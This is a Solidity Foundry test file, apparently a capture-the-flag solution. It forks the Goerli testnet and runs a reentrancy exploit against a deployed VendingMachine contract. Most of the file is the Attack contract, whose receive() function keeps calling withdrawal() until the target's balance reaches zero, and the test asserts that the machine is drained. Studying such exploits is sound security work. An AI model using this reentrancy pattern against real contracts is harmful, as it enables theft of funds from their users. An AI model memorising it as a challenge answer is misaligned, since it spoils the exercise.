// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.19;

import "../src/VendingMachine/VendingMachine.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract VendingMachineTest is Test {
    address alice;
    address contractAddress = 0x00f4b86F1aa30a7434774f6Bc3CEe6435aE78174;

    function setUp() public {
        string memory RPC = vm.envString("GOERLI_RPC_URL");
        vm.createSelectFork(RPC, 7235686);
        alice = makeAddr("alice");
        vm.deal(alice, 0.1 ether);
    }

    function testWithdraw() public {
        VendingMachine vendingMachine = VendingMachine(payable(contractAddress));
        vm.startPrank(alice);
        assertEq(alice.balance, 0.1 ether);

        Attack attack = new Attack{value: 0.1 ether}(vendingMachine);
        assertEq(alice.balance, 0 ether);

        attack.exploit();

        assertEq(address(vendingMachine).balance, 0 ether);
        vm.stopPrank();
    }
}

contract Attack {
    VendingMachine private machine;

    constructor(VendingMachine _machine) payable {
        machine = _machine;
    }

    function exploit() external {
        machine.deposit{value: 0.1 ether}();
        machine.withdrawal();
    }

    receive() external payable {
        if (address(machine).balance != 0) {
            machine.withdrawal();
        }
    }
}
